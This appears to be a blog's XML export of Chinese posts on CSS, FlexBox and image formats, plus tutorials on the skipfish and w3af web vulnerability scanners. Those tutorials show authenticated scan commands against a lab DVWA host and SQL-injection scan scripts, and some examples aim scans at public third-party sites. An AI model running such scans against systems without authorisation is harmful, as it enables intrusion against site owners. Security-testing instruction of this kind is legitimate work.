,lowercase , capitalize white-space 设置空白的处理方式 normal , pre-line (合并空白序列，但是保留换行符) , nowrap(防止元素中的文本换行)， pre(空白符不会被忽略), pre-wrap(保留空白符序列) word-spacing 单词间距(汉字不适用) letter-spacing 字母间距(汉字使用) text-shadow 文本阴影 四个参数{ px px px #f0000} text-wrap 规定文本换行规则 !Note1.网页中常用的字体大小为12 px/14 px;2.行高(行距)的大小不能小于段落中字体的大小，一般行距为14 px;3.em 单位,1 em 相当于当前字体的属性，2 em 相当于当前字体尺寸的两倍， em 是非常有用的单位，它可以自动使用用户所使用的字体.4.使文本垂直居中的小技巧就是为元素设置行高 line-height，使其水平居中设置 text-align:center 0x05 背景 属性 描述 属性值 background-color 设置元素的背景颜色 rgba(0,0,0,0.5)设置背景透明 background-image 设置元素的背景图片 background-position 设置背景图片的起始位置 left ,right , center, top , bottom 也可以使用数值: px , 百分比 background-repeat 设置背景图片是否及如何重复 repeat (重复); no-repaet (不重复); repeat-x (横向平铺); repeat-y (纵向平铺)；默认为 repeat background-attachment 背景图案是否固定或者随着页面滚动 fixed , scroll ;默认值 scroll background-size 控制背景图片的尺寸 50%,100px,50px,cover(拉大，覆盖；保持宽高比),contain(缩小，使其恰好适合背景区；保持宽高比) background-clip 控制元素背景显示区域 border-box , padding-box ,context-box 12345678910111213body &#123; background-color:rebeccapurple; background-image:url(&quot;03ec10.jpg&quot;); #注意url的格式 background-repeat:no-repeat;#设置背景图片是否重复显示以及如何显示 background-attachment:fixed;#设置图片随着内容一起滚动(相对浏览器固定) background-position:right center; background-size:100px 100px;#设置背景图片的大小&#125;!&lt;--background 的简写属性--&gt;body&#123; background: red url(&quot;123.jpj&quot;) no-repeat center;&#125; !Note \1.background-postion 属性值要先写水平方向的属性，再写垂直方向的属性。\2.background-attachment 属性只适用于 body 0x06 列表项目的符号样式 list-style 属性 描述 属性值 list-style-type 列表项目符号样式 none , dashed , circle list-style-image 设置图片作为项目符号 list-style-position 项目符号定位 inside(符号在列表项内) , outside (符号在列表项外)) list-style-type对于无序列表的 list-style-type 属性值有三种: disc, circle, square 有序列表的 list-style-type 属性值有: decimal, lower-roman, upper-roman, lower-latin, upper-latin list-style 简写12ul li &#123; list-style: url(&quot;listtypeiamge.png&quot;) inset; 0x07 行元素,块元素和空元素行内元素 1)和其它元素都在一行上; \2)元素的高度，宽度，行高及顶部和底部的边距不可设置; \3)元素的宽度就是它包含文字或者图片的宽度，不可改变； 但是在行元素中有两个例外的标签 input , img。 所以，行内元素在设置 水平方向的 padding-left、padding-right、margin-left、margin-right 都产生边距效果，但竖直方向的 padding-top 、padding-bottom、margin-top、margin-bottom 却不会产生边距效果。 块级元素 1)每个块级元素都从新的一行开始，并且其后的元素也另起一行。（真霸道，一个块级元素独占一行）;\2)元素的高度、宽度、行高以及顶和底边距都可设置; \3)元素宽度在不设置的情况下，是它本身父容器的100%（和父元素的宽度一致），除非设定一个宽度。 块元素和行元素列表 空元素知名的空元素: &lt;br&gt; &lt;hr&gt; &lt;img&gt; &lt;input&gt; &lt;meta&gt; &lt;link&gt; 0x08 单位长度单位emem 为相对长度单位，相对于当前对象内文本的字体尺寸(font-size)。比如：Web页面中body的文字大小在用户浏览器下默认渲染是16 px，所以，此时的 1em = 16px; in (英寸:inches), pt(点:points)in 和 pt 都是绝对长度单位，它们的关系如下: 11 in = 2.54 cm = 25.4 mm = 72 pt = 6 pc =96 px 角度单位deg度(Degress)。 一个圆共360度 grag梯度(Gradians)。一个圆共400梯度 turn转，圈(turn)。一个圆共1圈 rad弧度(Radians)。一个圆共2pi弧度 各个角度之间的关系190 deg = 100 grad = 0.25 turn 0x09 盒子模型 盒模型中主要是使用div来进行布局的，其构成元素为: margin 外边距， border 边框， padding 内填充， content 内容。 其width和height的设置是针对content的宽度和高度的设置。 整个div所占的宽度和高的=内容+内边距+边框+外边距 WEB标准中padding的使用规范当padding为四个值的时候按照顺时针： padding-top -&gt; padding-right -&gt; padding-bottom -&gt; padding-left 的顺序。 属性 对应值 padding四个值 top , right , bottom , left padding三个值 top , left right , bottom paddin二个值 top bottom , left right 与 padding 属性相似的属性还有 margin 。 !Note 关于 marginmargin-left 使当前元素向右移动，margin-right 使得下一个元素向右移动。 边框样式 borderborder-colorborder-widthborder-style属性值有： dashed (虚线) , dotted (点) , double (双线) , solid (实线), inset, outset, ridge, groove 此外还可以使用 none 或者 hidden 来明确的移除边框，或者设置边框颜色为 transparent 来让边框不可见，后者不会影响布局。 border-radius [ CSS3 ]border-radius 用于绘制圆角边框。其值可使用 px 或者 百分比。 1234border-radius:20px; 指定四个相同半径border-radius: 20px 40px; 左上，右上，剩下的对角匹配。border-radius: 5px 10px 40px;上左，上右，下右，下左。剩下的对角匹配。border-radius: 5px 10px 20p 40px;上左，上右，下右，下左。 单独绘制某一角圆角边框:12border-top-right-radius:右上角border-bottom-left:左下角 所以是对 border-radius 的描述方向是先垂直后水平 。 0x0B text-overflowtext-overflow 只有两个属性值。 12clip : 不显示省略标记，而是简单的剪裁ellipsis : 当对象内文本溢出时显示省略标记 注释:text-overflow 属性仅是注解，当文本溢出时是否显示省略标记。要实现溢出时产生省略号的效果还须定义：强制文本在一行内显示（white-space:nowrap）及溢出内容为隐藏（overflow:hidden），只有这样才能实现溢出文本显示省略号的效果。 显然该属性只对块元素有效，如果是 标签，呵呵~ 1.content &#123;overflow:hidden; white-space:nowrap;text-overflow:ellipsis;&#125; 0x0C gradient 渐变渐变分为 radial-gradient (径向渐变) 和 linear-gradient (线性渐变)。 linear-gradient1#mybox&#123;background:linear-gradient(to left,red, gold, black);&#125; 第一个参数可指定的参数值: 1234to bottom : 从上往下to right : 从左往右to top : 从下往上to left : 从右往左 其后的颜色值代表起点色，过渡色，终点色。 radial-gradient1background:radial-gradient(circle at left bottom,#0084d6,#016dcc) 所以对 radial-gradient 来讲，描述其方向的规则是 先水平后垂直.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[FlexBox]]></title>
      <url>%2F2016%2F09%2F08%2FFlexBox%2F</url>
      <content type="text"><![CDATA[0x00 FlexBoxflexbox 可以自动扩展其内部的 items 项目(元素) 的宽度或者高度以最大限度的去填充 flex 容器的可用空间，或者自动收缩其内部空间，以防止其内容溢出。 flexbox 的布局算法是与方向无关的，对于应用程序组件或者小规模的布局需求，flexbox 布局是很适合的，而针对大规模的布局，新兴的 Grid 布局或许是个不错的选择。 0x01 display:flex对指定的元素使用 display:flex 属性，它便成为了一个 FlexBox 元素，它依旧是块级元素，只是拥了有一些 FlexBox 的特性。 当然，脱离了传统的 vertical 和 horizontal 形式，FlexBox 需要一些新的概念，比如，主轴(main axis)，交叉轴(cross axis) 等。如下图： main axis: 是沿着 FlexBox 的布局方向，它并非就是水平或者垂直的，我们可以使用 flex-direction 这个属性去设置的我们布局方向，即是 main axis。 cross axis: 是与布局方向，即是与主轴垂直的轴。 先有这个两个概念。 当一个元素成为 flex 容器后，float ,clear,vertical-align 属性不再适用于 flexbox中的 item 了 0x02 flex-directionflex-direction 决定哪个方向为主轴的方向。flex-diretion 属性值如下:flex-direction:row:主轴为横向的，即是沿着水平方向布局(从左向右)。flex-direction:row-reverse:与 row 相反，沿着从右向左的方向布局flex-direction:colum:主轴为垂直的，沿着从上到下的方向布局。flex-direction:colum-reverse:与 colum 相反，沿着从下到上的方向布局。 实例代码:1234567891011121314151617181920212223242526272829303132333435363738//HTML&lt;div class=&quot;wrap&quot;&gt; &lt;div class=&quot;flex_item&quot;&gt;1&lt;/div&gt; &lt;div class=&quot;flex_item&quot;&gt;2&lt;/div&gt; &lt;div class=&quot;flex_item&quot;&gt;3&lt;/div&gt;&lt;/div&gt;//CSShtml&#123; font-size: 100px; max-width: 640px; min-width: 640px;&#125;.wrap&#123; margin: 1.5rem auto; border:1px solid deeppink; font-size: 0.16rem; width: 3.2rem; &#125;.flex_item&#123; width: 2rem; height: 2rem; text-align:center;&#125;.wrap .flex_item:nth-child(1)&#123; background: #333;&#125;.wrap .flex_item:nth-child(2)&#123; background: deeppink;&#125;.wrap .flex_item:nth-child(3)&#123; background: green;&#125; 对 wrap 使用 display:flex 和 flex-direction:row-reverse 12345678.wrap&#123; display: flex; flex-direction: row-reverse; margin: 1.5rem auto; border:1px solid deeppink; font-size: 0.16rem; width: 3.2rem; &#125; 0x03 flex-wrapflex-wrap 是 FlexBox 的换行属性，默认值为 flex-wrap:no-wrap 即不换行，此时 flex 容器中的 items （子元素）会随着 flex 容器的大小自动缩放，即使 items 设置了固定的 width/height 并且超过了容器的大小，也不会溢出，而是平分 flex 容器的空间。 flex-wrap 的属性值如下: flex-wrap:nowrap（默认值）:不换行flex-wrap:wrap:换行，第一行在最上flex-wrap:wrap-reverse:换行，第一行在最后123456789.wrap&#123; width: 3.2rem; /*flex 容器宽度为 3.2 rem*/&#125;.flex_item&#123; width: 3rem; /*items 的宽度和 6rem，没有 overflow ，而是平分 flex 容器的空间*/&#125; 为 flex 容器设置 flex-wrap:wrap: 12345678910.wrap&#123; flex-wrap:wrap; width: 3.2rem; /*flex 容器宽度为 3.2 rem*/&#125;.flex_item&#123; width: 3rem; /* items 宽度和 6rem，同样没有 overflow ，而是自动换行*/&#125; 0x04 flex-flowflex-flow 是 flex-direction 和 flex-wrap 两个属性的简写属性，只是这两个属性。 123.wrap&#123; flex-flow:row-reverse wrap-reverse;&#125; 0x04 items 中的 flex在 items 中使用 flex 可以设定每个 items 在 flex 容器中所占据的空间比例，而且还可以指定最小值。 flex 的书写格式是: flex: flex-grow flex-shrink flex-basis flex-grow:表示 item 扩展时在容器中所占据的空间比例flex-shrink:表示 item 缩放时在容器中所占据的空间比例flex-basis:表 item 的原始大小。 1234567891011121314.wrap .flex_item:nth-child(1)&#123; background: #333; flex:1 1 1rem;&#125;.wrap .flex_item:nth-child(2)&#123; background: deeppink; flex: 2 1 2rem;&#125;.wrap .flex_item:nth-child(3)&#123; background: green; flex: 3 1 3rem;&#125; justify-contentjustify-content 设置 flex 容器的 main axis 对齐方式。 justify-content 各属性值如下:justify-content:flex-start(默认值):在 main axis 的 flex-start 对齐 justify-content:flex-end:在 main axis 的 flex-end 对齐 justify-content:center:在 main axis 的 中心对齐 justify-content:space-between:在 main axis 的两端对齐。 justify-content:space-around: align-itemsalign-items 决定 cross axis 的对齐方式,align-items 于 justify-content 的作用是一致的，只是他们的方向不同而已，但是其与 align-content 区别在于，align-items 是作用于当前 flex 容器中的 items，而 align-content 则是用于 item 中内容的垂直对齐。 aling-items 其属性值有:align-items:center: 在 cross axis 中心对齐 align-items:flex-start: 在 cross axis 的 flex-sart 对齐 aling-items:flex-end: 在 cross axis 的 flex-end 对齐 align-items:stretch默认值):当 flex 容器有高度，而 items 没有高度时，items 的高度将会充满 flex 容器的高度。 align-items:baseline:在 items 中的 文字基线对齐 未完待续…]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Photoshop基础]]></title>
      <url>%2F2016%2F09%2F06%2FPhotoshop%E5%9F%BA%E7%A1%80%2F</url>
      <content type="text"><![CDATA[0x00 关于Web图片格式 GIF是Web上最常用的图像格式，它可以用来存储各种图像文件。特别适用于存储线条、图标和电脑生成的图像、卡通和其它有大色块的图像。GIF文件非常小，它形成的是一种压缩的8位图像文件，所以最多只支持256种不同的颜色。Gif支持动态图、透明图，适合动画或颜色较少的图片。 JPEG是Web上仅次于GIF的常用图像格式。JPEG是一种压缩得非常紧凑的格式，专门用于不含大色块的图像。JPEG的图像有一定的失真度，但是在正常的损失下肉眼分辨不出JPEG和GIF图像的差别。适合照片或颜色丰富的图片。 PNG格式是WEB图像中最通用的格式。它是一种无损压缩格式，但是如果没有插件支持，有的浏览器可能不支持这种格式。PNG格式最多可以支持32位颜色，但是不支持动画图。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[skipfish]]></title>
      <url>%2F2016%2F09%2F06%2Fskipfish%2F</url>
      <content type="text"><![CDATA[0x00 skipfish前言skipfish是由谷歌开发，使用c语言编写的实验性的主动web安全评估工具，他可以递归爬网，并进行基于字典的探测。优点是扫描速度快，因为是多路单线程，全异步网路I/O，消除内存管理和调度开销，并且支持启发式自动内容识别，有利于发现wep code中的bug。 0x01 skipfish首先skipfish是基于命令行的。 skipfish -o test host将扫描结果保存到test目录下 1root@kali:~# skipfish -o test1 http://192.168.234.129/dvwa 等待skipfish扫描完成，然后在test1目录下使用浏览器打开index.html页面，查看扫描结果。 但是观察报告页面，可以看到，skipfish不仅扫描了http://192.168.234.129/dvwa这个url，还扫描了http://192.168.234.129下的其它站点，这显然不是我想要的结果。 skipfish -o test @url.txt使用@调用url.txt文件，并且从中批量提取要扫描的url地址进行扫描: 1root@kali:~# skipfish -o test @url.txt -I skipfish -0 test -S world.wl url通过指定skipfish中的自带字典，去探测扫描可能隐藏的网站目录和隐藏页面。 默认情况，skipfish已经集成了多个字典在kali中: 1234567root@kali:~# dpkg -L skipfish | grep wl/usr/share/skipfish/dictionaries/medium.wl/usr/share/skipfish/dictionaries/minimal.wl/usr/share/skipfish/dictionaries/extensions-only.wl/usr/share/skipfish/dictionaries/complete.wl# skipfish中的worldlist以.wl结尾 使用-S参数指定脚本文件jFuzzing: 1root@kali:~# skipfish -o test3 -I /dvwa -S /usr/share/skipfish/dictionaries/minimal.wl http://192.168.234.129 skipfish -0 test -S complet.wl -W a.wl urlcomplet.wl -W a.wl 使用特定的只读worldList.wl文件对目标网站Fuzzing，并且将该网站下的特殊字符或者目录保存到a.wl文件中去。 对后续的Debug也许有一定的帮助。 -I 只检查包含string的URL1root@kali:~# skipfish -o test1 -I /dvwa/ http://192.168.234.129/dvwa 添加-I参数，扫描只包含/dvwa的url。 -X 不检查包含string的URL1root@kali:~# skipfish -o test1 -X logout.php http://192.168.234.129/dvwa -D 跨站爬取偶尔，我们可能也许同时扫描多个网站，比如提交一个from，但是该from的action是iframe中的，那么此时有必要对该iframe中url进行fuzzing。 在skipfish中可以使用-D参数，进行跨域扫描。 1root@kali:~# skipfish -o test1 -I /dvwa/ -D www.w3c.com http://192.168.234.129/dvwa 当HTTP://192.168.234.129，中存在www.w3c.com的链接时，则同时对www.w3c.com进行fuzzing，若是不存在，则不fuzzing。 -l 每秒的最大请求数1root@kali:~# skipfish -o test1 -I /dvwa/ -l 2000 http://192.168.234.129/dvwa -m 每IP最大连接并发数1root@kali:~# skipfish -o test11 -l 2000 -m 5 http://192.168.234.129/dvwa 0x02 skipfish 身份认证skipfish没有GUI，但是它仍然可以进行身份认证。 cookies身份认证 -C在Firefox中使用Firebug，选择cookies选项，导出cookies为txt文件，获得cookies的字段和值。 使用-C参数，将cookies填充到shell command中。 1root@kali:~# skipfish -o test19 -C &quot;PHPSESSID=7edae86d27b4a18843d88d52e4062e58&quot; -C &quot;security=high&quot; -I /dvwa -X logout.php http://192.168.234.129/dvwa 身份认证 -A/–authorskipfish除了可以使用cookies认证，还提供更强大的user:pass形式以直接提交表单的方式去认证。 –author-form :指定表单所在的url地址 : 192.168.234.129/dvw/login.php –author-username :用户登录名 admin –author-pass 登录密码: password –author-verfiy-url 验证表单是否登录成功: 当进入到192.168.234.129/dvwa/index.php 页面时代表登陆成功。 –auth-form-target 指定表单要提交的后台地址，既form的action –auth-user-field :指定登录名所在位置的field –auth-pass-field :指定登录密码所在field 12345678root@kali:~# skipfish -o test --auth-form http://192.168.234.129/dvwa/login.php \--auth-form-target http://192.168.234.129/dvwa/login.php \--auth-user-field username \--auth-user admin \--auth-pass-field password \--auth-pass password \--auth-verify-url http://192.168.234.129/dvwa/index.php \-I dvwa http://192.168.234.129/dvwa 等待扫描完毕，使用firefox打开test下index.html文件查看扫描报告: 1root@kali:~# firefox test/index.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[W3AF身份认证]]></title>
      <url>%2F2016%2F09%2F05%2FW3AF%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%2F</url>
      <content type="text"><![CDATA[0x00 W3AF简介无论是Httrack，Nikto，Vega还是skipfish都是比较轻量级的tools。Web Application Attack and Audit Framework，基于Python编写的Web渗透测试框架，此框架的目标是用来发现和利用所有WEB应用程序bug。 不同于，nikto，vega，这些都是个别的大牛一时兴起而写出来的，毕竟个人的能力是有限的，所以很有可能这些工具也只是停留在一个版本就绝迹了，而w3af是基于开源的，所以它的生命周期会更长。 现在w3af一共覆盖了9个大类近150个plugin： audit:审计，在该组件下，集成了大量的web扫描工具。 infrastructure:基础架构，主要用来扫描服务器的banner等基本信息。 grep:被动扫描类型。 evasion:逃避，主要是用来逃避目标的IDS，IBS的检测。 mangle:主要是基于正则表达式的信息替换，比如注入，代码修改。 auth:基于表单的身份认证。 brutefoece:暴力破解。 output:对扫描出来的结果输出为特定的文件。 crawl:爬网，比如web spider，爬网爬得越全，那么发现漏洞的可能行越大。 attack其实attack算是w3af中的第十类，但是不同与前九个，attck模块不能人为的进行配置的，所有的攻击的方法都是固定的，使用者无法修改。 0x01 原生安装 w3af测试Kali自带w3af在Kali Rolling上测试自带w3af失败。 杀死所有有关w3af的进程: 12root@kali:~# ps -aux | grep -n w3afroot@kali:~# kill -9 8362 8437 9943 9945 9946 9949 10086 安装步骤在主目录里实现源码下载和安装等相关步骤: 1$ cd ~ 更新update源:1apt-get update 安装pip以及w3af1apt-get install -y python-pip w3af 升级pip: 1pip install --upgrade pip 通过 github clone w3af 源代码 : 1git clone https://github.com/andresriancho/w3af.git 等待w3af源代码下载完成，然后进入w3af目录:1$ cd w3af 1./w3af_console (./w3af.gui) 提示，需要安装相关依赖: 123$ apt-get install python-dev libxml2-dev libxslt1-dev zlib1g-dev$ apt-get build-dep python-lxml 然后，可以使用pip或者运行替换脚本安装w3af的相关依赖: 12$ ./tmp/w3af_dependency_install.sh#$ pip install pyClamd==0.3.15 PyGithub==1.21.0 GitPython==0.3.2.RC1 nltk==3.0.1 chardet==2.1.1 tblib==0.2.0 futures==2.1.5 ndg-httpsclient==0.3.3 pyasn1==0.1.8 lxml==3.4.4 scapy-real==2.2.0-dev guess-language==0.2 msgpack-python==0.4.4 python-ntlm==1.0.1 Jinja2==2.7.3 markdown==2.6.1 psutil==2.2.1 mitmproxy==0.13 ruamel.ordereddict==0.4.8 升级w3af12 root  ~  cd w3af root  ~  w3af  git pull 创建w3af快捷方式Linux下的快捷方式文件都是已 .desktop 结尾的。 首先将 Kali 自带的 w3af 的快捷方式 copy 到桌面 1$: cp /usr/share/applications/w3af.desktop /root/Desktop 然后打开 w3af.desktop 文件 123456789101112 root  ~  cd Desktop root  ~  Desktop  vim w3af.desktop [Desktop Entry]Name=w3afEncoding=UTF-8Exec=sh -c &quot;/root/w3af/w3af_gui&quot; &lt;---修改为最新安装的 w3af_gui 启动路径Icon=kali-w3af.pngStartupNotify=falseTerminal=falseType=ApplicationCategories=03-webapp-analysis;X-Kali-Package=w3af 保存退出 vim，回到 desktop 为w3af.desktop 添加运行权限 1 root  ~  Desktop  chmod u+x w3af.desktop w3af有两种启动方式，console和GUI启动. 0x02 w3af_console 使用简介 help命令help 可以查看w3af当前模块下可用的命令 1234567891011121314151617181920212223 root  ~  w3af  ./w3af_console w3af&gt;&gt;&gt; help|----------------------------------------------------------------------------|| start | Start the scan. || plugins | Enable and configure plugins. || exploit | Exploit the vulnerability. || profiles | List and use scan profiles. || cleanup | Cleanup before starting a new scan. ||----------------------------------------------------------------------------|| help | Display help. Issuing: help [command] , prints more || | specific help about &quot;command&quot; || version | Show w3af version information. || keys | Display key shortcuts. ||----------------------------------------------------------------------------|| http-settings | Configure the HTTP settings of the framework. || misc-settings | Configure w3af misc settings. || target | Configure the target URL. ||----------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||----------------------------------------------------------------------------|| kb | Browse the vulnerabilities stored in the Knowledge Base ||----------------------------------------------------------------------------| plugins模块plugins 功能下共有九个可供选择的扫描模块。 比如:1w3af/plugins&gt;&gt;&gt; audit xss sqli lfi 代表选择同时 audit 下的 xss ，sqli 和 lfi 扫描功能。 当然也可以指定 audit 下的所有功能 1w3af/plugins&gt;&gt;&gt; audit all 确定选择以后，各个 功能 对应的 status 将会启动。 12w3af/plugins&gt;&gt;&gt; crawl spider_man w3af/plugins&gt;&gt;&gt; back 选择完成以后使用 back 返回上一级目录。 profile我们可以就将所选的 plugins 下的配置通过 profile 保存，方便下次直接调用。 12w3af&gt;&gt;&gt; profiles save_as myScanProfileProfile saved. 使用 profile1w3af/profiles&gt;&gt;&gt; use fast_scan w3af 的全局设置http-settings12345678910111213141516171819202122232425262728293031323334353637383940414243444546w3af&gt;&gt;&gt; http-settings w3af/config:http-settings&gt;&gt;&gt; view|----------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------|| url_parameter | | | URL parameter || | | | (http://host.tld/path;&lt;parameter&gt;) || timeout | 0 | | HTTP connection timeout || headers_file | | | HTTP headers filename which || | | | contains additional headers to be || | | | added in each request ||----------------------------------------------------------------------------|| cookie_jar_file | | | Cookie Jar file holding HTTP || | | | cookies-指定一个包含cookies信息的文件 || ignore_session_cookies | False | | Ignore session cookies ||----------------------------------------------------------------------------|| ntlm_auth_url | | | NTLM authentication domain (target || | | | domain name) || ntlm_auth_user | | | NTLM authentication username || ntlm_auth_passwd | | | NTLM authentication password || ntlm_auth_domain | | | NTLM authentication domain || | | | (windows domain name) ||----------------------------------------------------------------------------|| rand_user_agent | False | | Use random User-Agent header 使用能够随机的user-agent || max_file_size | 400000 | | Maximum file size || max_http_retries | 2 | | Maximum number of HTTP request || | | | retries || user_agent (默认agent为w3f，不建议使用默认值) | w3af.org | | User Agent header || max_requests_per_second | 0 | | Maximum HTTP requests per second ||----------------------------------------------------------------------------|| string_match_404 | | | Tag HTTP response as 404 if the || | | | string is found in it&apos;s body || always_404 | | | Comma separated list of URLs which || | | | will always be detected as 404 || | | | pages || never_404 | | | Comma separated list of URLs which || | | | will never be detected as 404 || | | | pages ||----------------------------------------------------------------------------|| proxy_port (支持外部代理) | 8080 | | Proxy TCP port || proxy_address | | | Proxy IP address ||----------------------------------------------------------------------------|| basic_auth_user (w3af的基本认证信息) | | | Basic authentication username || basic_auth_passwd | | | Basic authentication password || basic_auth_domain | | | Basic authentication domain ||----------------------------------------------------------------------------| 不使用默认的 user-agent 使用随机user-agent1w3af/config:http-settings&gt;&gt;&gt; set rand_user_agent True 设置完毕后 save ，并 back 上一级目录 12345w3af/config:http-settings&gt;&gt;&gt; save The configuration has been saved.w3af/config:http-settings&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; misc-settings12w3af&gt;&gt;&gt; misc-settings w3af/config:misc-settings&gt;&gt;&gt; help 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687w3af/config:misc-settings&gt;&gt;&gt; view|----------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------|| msf_location | /opt/metasploit3/bin/ | | Full path of || | | | Metasploit || | | | framework || | | | binary || | | | directory || | | | (/opt/metasploit3/bin/ || | | | in most linux || | | | installs) ||----------------------------------------------------------------------------|| interface | wlan0 | | Local || | | | interface || | | | name to use || | | | when || | | | sniffing, || | | | doing reverse || | | | connections, || | | | etc. || local_ip_address | 192.168.1.6 | | Local IP || | | | address to || | | | use when || | | | doing reverse || | | | connections ||----------------------------------------------------------------------------|| max_discovery_time | 120 | | Maximum crawl || | | | time || | | | (minutes) || stop_on_first_exception | False | | Stop scan || | | | after first || | | | unhandled || | | | exception ||----------------------------------------------------------------------------|| non_targets | | | A comma || | | | separated || | | | list of URLs || | | | that w3af || | | | should || | | | completely || | | | ignore ||----------------------------------------------------------------------------|| fuzz_url_filenames | False | | Indicates if || | | | w3af plugins || | | | will send || | | | fuzzed file || | | | names in || | | | order to find || | | | vulnerabilities || fuzz_url_parts | False | | Indicates if || | | | w3af plugins || | | | will send || | | | fuzzed URL || | | | parts in || | | | order to find || | | | vulnerabilities || fuzzable_headers | | | A list with || | | | all fuzzable || | | | header names || fuzzed_files_extension | gif | | Indicates the || | | | extension to || | | | use when || | | | fuzzing file || | | | content || form_fuzzing_mode | tmb | | Indicates || | | | what HTML || | | | form combo || | | | values w3af || | | | plugins will || | | | use: all, tb, || | | | tmb, t, b || fuzz_form_files | True | | Indicates if || | | | w3af plugins || | | | will send || | | | payloads in || | | | the content || | | | of || | | | multipart/post || | | | form files. || fuzz_cookies | False | | Indicates if || | | | w3af plugins || | | | will use || | | | cookies as a || | | | fuzzable || | | | parameter ||----------------------------------------------------------------------------| target 模块target 用于设置需要被扫描的目标地址。 12345678910w3af&gt;&gt;&gt; target w3af/config:target&gt;&gt;&gt; view |---------------------------------------------------------------------------|| Setting | Value | Modified | Description ||---------------------------------------------------------------------------|| target_framework | unknown | | Target programming framework || | | | (unknown/php/asp/asp.net/java/jsp/cfm/ruby/perl) || target (设置要扫描的网站url) | | | A comma separated list of URLs || target_os (设置要扫描的操作体统的主机ip)| unknown | | Target operating system (unknown/unix/windows) ||---------------------------------------------------------------------------| 使用 target 指定目标地址1234567891011w3af/config:target&gt;&gt;&gt; set target http://www.sina.comw3af/config:target&gt;&gt;&gt; view|---------------------------------------------------------------------------|| Setting | Value | Modified | Description ||---------------------------------------------------------------------------|| target_framework | unknown | | Target programming framework || | | | (unknown/php/asp/asp.net/java/jsp/cfm/ruby/perl) || target | http://www.sina.com | Yes | A comma separated list of URLs || target_os | unknown | | Target operating system || | | | (unknown/unix/windows) ||---------------------------------------------------------------------------| 使用self-contained 将上述设置另存为123w3af&gt;&gt;&gt; profiles w3af/profiles&gt;&gt;&gt; save_as test2 self-containedProfile saved. 由此，我们可以将 test1 设置与他人共享。 start 启动扫描1w3af&gt;&gt;&gt; start w3af下 scriptw3af 也自带了许多的扫描脚本 123 root  ~  w3af  1  cd scripts root  ~  w3af  scripts  1  ls allowed_methods.w3af login_brute_password_only.w3af 以sqli.w3af 脚本为例我们只需要修改脚本中的 target 地址便可以很方便的调用这些脚本了 123456789101112131415161718192021222324252627282930313233343536 root  ~  w3af  scripts  1  cat sqli.w3af   master # This is a demo of the attack plugin sql_shellpluginsoutput console,text_fileoutput config text_fileset output_file output-w3af.txtset verbose Truebackoutput config consoleset verbose Falsebackaudit sqlicrawl web_spidercrawl config web_spiderset only_forward Truebackgrep path_disclosurebacktargetset target http://www.sina.com &lt;---更改为目标ipbackstartbug-reportdetails 0backexit ./w3af_console -s scripts/scriptname.weaf1 root  ~  w3af  1  ./w3af_console -s scripts/sqli.w3af 脚本执行完成，并会在w3af根目录下生成 扫描报告 :123 root  ~  w3af  1  ls   master circle.yml extras profiles tools w3af_api w3af_guidoc output-w3af.txt scripts w3af w3af_console 0x03 w3af 身份认证w3af 支持四种身份认证: HTTP Basic , NTLM , Form , Cookie 。不同的认证方式对应不同的目标扫描类型。 HTTP BasicHTTP Basic 并没有严格意义上的加密，只不过是经过了简单的编码而已，基于这种认证，使用很简单的破解工具便可以破解了。 我们以 win7 为例，首先安装win7 IIS 服务器，选择默认网站属性，关闭默认网站的匿名身份认证，从而选择基本身份认证，并设置登录的用户名和密码。 然后通过Kali去访问该网站，使用 wireshark 进行抓包，通过 Floow TCP Stream 分析，我们可以得到一个 经过 base64 进行编码的 Authorization 信息，其中包含了登录使用的用户名和密码，使用 W3af --&gt; tools --&gt; Encode/Uncode 功能对所得到编码字符进行反向解码便可以得到用户名和密码。 对使用 HTTP basic 认证的网站进行扫描在 Configuration –&gt; HTTP Config –&gt; Basic HTTP Authentication 添加基本认证信息: 等待一切配置完毕可以勾选需要扫描的模块进行扫描，在 Target 中指定要扫描的目标 url。 NTMLNTML 身份认证是微软一家才有的身份认证方式。 开启 NTML 的认证功能需要使用到 IIS 的集成身份认证摸块。NTML 也是windows 下的默认身份认证方式。 然后，回到 Kali 下的 W3af中配置 NTML 认证信息。 同样的，等待一切配置完毕可以勾选需要扫描的模块进行扫描，在 Target 中指定要扫描的目标 url。 基于From的身份认证基于From的身份认证便不能使用 W3af的HTTP Configuration了，而是使用 W3af中的 auth 插件，目前 w3af 提供两种方式的 From 表单提交认证,即是 detailed 和 generic方法，detailed 相比于 generic的信息更加详细。 detailed选择 W3f 下的 auth 插件在的 detailed 选择，配置要提交的From信息， username_field 和 password_field分别表示在表单中要提交的用户名和密码控件的 username，如下所示: auth_url 表示表单所在的url地址。 check_url 表示一旦表单验证成功以后进入的页面，主要是为了验证表单提交是否成功。同样，check_string 具有同样的作用，它表示的是表单登录成功以后可以看到的特征字符串。 ok,配置完成以后，选择保存，继续进行 crawl 爬网插件的配置。 在 crawl 下首先需要要选择 web_Spider 一项勾选 only_forward指定在该 target url 下要扫描的特定的子目录。同时还可以配置follow_regex (需要扫描的特定类型的页面)和 ignore_regex (需要忽略的页面) 以此进行交叉组合筛选。 Cookie 双因素身份认证W3af Cookie认证方法比较严格的，直接copy cookies 信息是没法认证的。所以首先需要导出 cookies 的信息。 比如，使用 firebug 导出 dvwa 站点的 cookies 信息，格式如下 12192.168.56.101 FALSE / FALSE PHPSESSID c04db28f36bf5cd9a7e4ebfed22045bd192.168.56.101 FALSE /dvwa/ FALSE security high 将其改成 w3af 的专用格式:1234# Netscape HTTP Cookie File192.168.56.101 FALSE / FALSE 173151000100 PHPSESSID c04db28f36bf5cd9a7e4ebfed22045bd192.168.56.101 FALSE /dvwa/ FALSE 173151000100 security high//domain flag path secure_flag 时间信息，表示cookie有没有过期 name name value 根据 W3af 官方的解释，使用cookie 信息时，每一行之上必需使用特定的数据格式，其各个数据字段之间必需使用 TAB 制表符来进行分隔，而不是空格。 更改完 cookies 格式以后，将其保存为本地文件，回到 w3af –&gt; HTTP Configuration 下选择 Cookies,导入保存的本地 cookie 文件。 ok,cookies 信息配置完成，接下来可以在 audit 